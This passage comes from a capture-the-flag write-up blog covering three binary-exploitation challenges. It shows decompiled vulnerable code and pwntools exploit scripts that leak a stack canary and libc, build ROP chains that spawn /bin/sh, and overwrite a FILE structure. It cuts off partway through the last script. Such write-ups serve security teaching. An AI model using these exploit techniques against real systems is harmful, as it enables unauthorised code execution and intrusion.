+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no threads remaining&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(command, <span style="color:#e6db74">&#34;CHONK &#34;</span>, <span style="color:#ae81ff">5uLL</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(chonk);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;unknown command&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print</span>(Arg <span style="color:#f92672">*</span>arg)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> count; <span style="color:#75715e">// [rsp+10h] [rbp-60h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> seconds; <span style="color:#75715e">// [rsp+14h] [rbp-5Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> message[<span style="color:#ae81ff">72</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-50h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> canary; <span style="color:#75715e">// [rsp+68h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(message, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">64</span>);
+</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> arg<span style="color:#f92672">-&gt;</span>count;
+</span></span><span style="display:flex;"><span>  seconds <span style="color:#f92672">=</span> arg<span style="color:#f92672">-&gt;</span>sleep;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(message, arg<span style="color:#f92672">-&gt;</span>src, arg<span style="color:#f92672">-&gt;</span>size); <span style="color:#75715e">// Overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">while</span> ( count<span style="color:#f92672">--</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(message);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(seconds); <span style="color:#75715e">// Sleep can prevent crashing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>My exploitation strategy is to leak the <strong>canary</strong> and a <strong>libc</strong> address from the stack,
+and after that, perform a <strong>ret2libc</strong> attack by executing <code>system(&quot;/bin/sh&quot;)</code> to get a shell.</p>
+<p>I set a large number for the seconds so the binary doesn&rsquo;t crash when the canary is overwritten.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;CHUNKS 3&#34;</span>)
+</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;CHUNK 100 1 &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">73</span>)
+</span></span><span style="display:flex;"><span>ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">73</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>r(<span style="color:#ae81ff">7</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Canary: </span><span style="color:#e6db74">{</span>canary<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;CHUNK 100 1 &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">88</span>)
+</span></span><span style="display:flex;"><span>ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">88</span>)
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(r(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9caa4</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc leak: </span><span style="color:#e6db74">{</span>libc_leak<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75b</span>
+</span></span><span style="display:flex;"><span>ret     <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75c</span>
+</span></span><span style="display:flex;"><span>binsh   <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>,
+</span></span><span style="display:flex;"><span>    canary,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rdi, binsh,
+</span></span><span style="display:flex;"><span>    ret,
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;CHUNK 1 1 &#34;</span> <span style="color:#f92672">+</span> payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ia()
+</span></span></code></pre></div><p>Full exploit can be found here: <a href="/blog/scripts/l3ak25/chunky_threads.py">exploit.py</a></p>
+<h3 id="go-write-where">Go Write Where</h3>
+<p>This challenge is a <strong>Golang</strong> version of challenges with one arbitrary write.
+<strong>PIE</strong> is turned off, so we can write some byte value there.</p>
+<p>The trick is to notice that the one arbitrary read/write happens inside a for loop,
+so if we can change <code>i</code>, we get more arbitrary reads/writes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1LL</span>; i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">=</span> prev_i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    prev_i <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>We can change <code>i</code> because in <strong>Golang</strong> the stack is actually partially predictable,
+looking something like <code>0xc000???xxx</code> where <code>?</code> is random and <code>x</code> is some offset.</p>
+<p><img src="/blog/images/l3ak25/go_stack.png" alt="stack"></p>
+<p>Knowing this, we can change <code>i</code> and perform enough arbitrary writes
+to write a ROP chain on the stack and get a shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>i_ptr <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#34;&gt; &#34;</span>), <span style="color:#ae81ff">16</span>) <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>DBG <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0xc00009cdb8</span>
+</span></span><span style="display:flex;"><span>ret_addr <span style="color:#f92672">=</span> i_ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x190</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x46b3e6</span>
+</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4224c4</span>
+</span></span><span style="display:flex;"><span>mov_rsi_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41338f</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x000000000047bd2e : pop rdx ; sbb byte ptr [rax + 0x29], cl ; ret</span>
+</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x47bd2e</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40336c</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x598f00</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    pop_rdi, binsh,
+</span></span><span style="display:flex;"><span>    pop_rax, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    mov_rsi_rax,
+</span></span><span style="display:flex;"><span>    pop_rax, binsh,
+</span></span><span style="display:flex;"><span>    pop_rdx, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rax, <span style="color:#ae81ff">0x3b</span>,
+</span></span><span style="display:flex;"><span>    syscall
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;r/w): &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w&#34;</span>)
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;): &#34;</span>, h2b(i_ptr))
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;): &#34;</span>, h2b(len(payload) <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i, b <span style="color:#f92672">in</span> enumerate(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;r/w): &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w&#34;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;): &#34;</span>, h2b(binsh <span style="color:#f92672">+</span> i))
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;): &#34;</span>, h2b(b))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i, b <span style="color:#f92672">in</span> enumerate(payload):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">. written&#34;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;r/w): &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w&#34;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;): &#34;</span>, h2b(ret_addr <span style="color:#f92672">+</span> i))
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;): &#34;</span>, h2b(b))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ia()
+</span></span></code></pre></div><p>Full exploit can be found here: <a href="/blog/scripts/l3ak25/go_write_where.py">exploit.py</a></p>
+<h3 id="cosmofile">cosmofile</h3>
+<p>This challenge is a binary built with <strong>Cosmopolitan Libc</strong>.
+The binary is actually pretty simple, and it hints at using some kind of File Structure exploit.
+The &lsquo;problem&rsquo; is that the implementation of <code>fread</code> and the <code>FILE</code> struct
+is different from the usual <strong>GLIBC</strong> implementation.</p>
+<p>The binary creates a file and writes some strings into it.
+There are 3 choices for interaction: printing the content of the file, exiting, and reading into the file structure of that file.
+Printing the content of the file uses <code>fread</code> into a buffer and then <code>write</code> to stdout.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _BYTE buf[<span style="color:#ae81ff">4100</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-1010h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> choice; <span style="color:#75715e">// [rsp+1004h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  FILE <span style="color:#f92672">*</span>f; <span style="color:#75715e">// [rsp+1008h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/tmp/cosmofile.txt&#34;</span>, <span style="color:#e6db74">&#34;rw+&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdin, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( f )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Here is a secret of the universe:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">... huh?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x2BuLL</span>, f);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;It&#39;s not here...&#34;</span>, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x10uLL</span>, f);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fflush</span>(f);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rewind</span>(f);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">menu</span>();
+</span></span><span style="display:flex;"><span>          choice <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_int</span>();
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> (_DWORD)<span style="color:#f92672">&amp;</span>unk_6E7472 )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">cosmo_puts</span>(<span style="color:#e6db74">&#34;Whoa whoa whoa... you can&#39;t just hide the secret of the universe like that!&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">cosmo_puts</span>(<span style="color:#e6db74">&#34;Just kidding, that&#39;s not really a secret...&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, f, <span style="color:#ae81ff">0x70uLL</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">&lt;=</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>unk_6E7472 )
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>LABEL_12:
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cosmo_puts</span>(<span style="color:#e6db74">&#34;Invalid choice. Please try again.&#34;</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">cosmo_print</span>(<span style="color:#e6db74">&#34;Exiting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_12;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cosmo_print</span>(<span style="color:#e6db74">&#34;Reading from cosmofile:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fread</span>(buf, <span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x1000uLL</span>, f);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cosmo_puts</span>(<span style="color:#e6db74">&#34;Content of cosmofile:&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, buf, <span style="color:#ae81ff">0x1000uLL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cosmo_puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Nice, now you can see the universe in a different light!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Failed to open file&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After looking at the <code>FILE</code> structure and <code>fread</code> for some time,
+I realized it is simpler than the standard implementation.</p>
+<p>There is a part of <code>fread</code> that calls <code>readv</code> on the input buffer and a buffer inside
+the structure from the file descriptor inside the struct.</p>
+<p>We can use this to read from stdin into an arbitrary buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> FILE
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> bufmode;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> freethis;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> freebuf;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> forking;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> oflags;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> state;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pid;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__attribute__</span>((<span style="color:#a6e22e">aligned</span>(<span style="color:#ae81ff">8</span>))) <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> beg;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> end;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">pthread_mutex_t</span> lock;
+</span></span><span style="display:flex;"><span>  Dll elem;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>getln;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">fread_unlocked</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> size, <span style="color:#66d9ef">size_t</span> count, FILE <span style="color:#f92672">*</span>f) 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    diff <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>end <span style="color:#f92672">-</span> f<span style="color:#f92672">-&gt;</span>beg;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    iov[<span style="color:#ae81ff">0</span>].iov_base <span style="color:#f92672">=</span> buf <span style="color:#f92672">+</span> diff;
+</span></span><span style="display:flex;"><span>    iov[<span style="color:#ae81ff">0</span>].iov_len <span style="color:#f92672">=</span> count <span style="color:#f92672">*</span> size <span style="color:#f92672">-</span> diff;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    iov[<span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>buf;
+</span></span><span style="display:flex;"><span>    iov[<span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>size;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">readv</span>(f<span style="color:#f92672">-&gt;</span>fd, iov, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When I initially called printing from the file, I got some leaks and used them to get a stack leak.
+After that, I used a file structure overwrite to get an arbitrary read from stdin
+and write a ROP chain on the stack.</p>
+<p>I tried getting a shell, but it didn&rsquo;t work on remote,
+so I just opened the file and called <code>sendfile</code> to stdout to get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;of cosmofile:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> r(<span style="color:#ae81ff">0x1000</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> len(res) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000</span>:
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">+=</span> r(<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(res))
+</span></span><span style="display:flex;"><span>stack_leak <span style="color:#f92672">=</span> u64(res[<span style="color:#ae81ff">2728</span>:<span style="color:#ae81ff">2736</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xec8</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Stack leak: </span><span style="color:#e6db74">{</span>stack_leak<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fp <span style="color:#f92672">=</span> FILE()
+</span></span><span style="display:flex;"><span>fp<span style="color:#f92672">.</span>oflags <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>fp<span style="color:#f92672">.</span>beg <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>fp<span style="color:#f92672">.</span>fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>fp<span style="color:#f92672">.</span>size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2000</span>
+</span></span><span style="display:flex;"><span>fp<span style="color:#f92672">.</span>bufmode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>fp<span style="color:#f92672">.</span>buf <span style="color:#f92672">=</span> stack_leak
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;7238770&#34;</span>)
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;secret...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fp<span style="color:#f92672">.</span>bytes())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>syscall_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4111fa</span>
+</span></span><span style="display:flex;"><span>pop_rsi_rdi_rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40401d</span>
+</span></span><span style="display:flex;"><span>pop_rdx_rbx_rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x427748</span>
+</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40bdf5</span>
